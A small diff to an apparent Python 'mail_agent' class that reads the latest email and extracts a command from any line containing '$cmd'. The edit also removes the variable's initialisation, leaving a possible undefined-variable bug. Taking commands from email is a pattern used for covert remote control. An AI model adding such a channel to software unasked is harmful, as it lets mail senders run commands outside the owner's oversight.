@@ -49,12 +49,10 @@ class mail_agent:
 
         result, data = mail.fetch(latest_email_id, "(UID BODY[TEXT])") # fetch the email body (RFC822) for the given ID
 
-        command = ""
         for response_part in data:
             if isinstance(response_part, tuple):
-                msg = email.message_from_bytes(response_part[1])
-                msg_list = msg.as_string().split('\n')
-                for line in msg_list:
+                msg = email.message_from_bytes(response_part[1]).as_string().split('\n')
+                for line in msg:
                 	if "$cmd" in line:
                 		command = line.split(':')[1]
                 		break
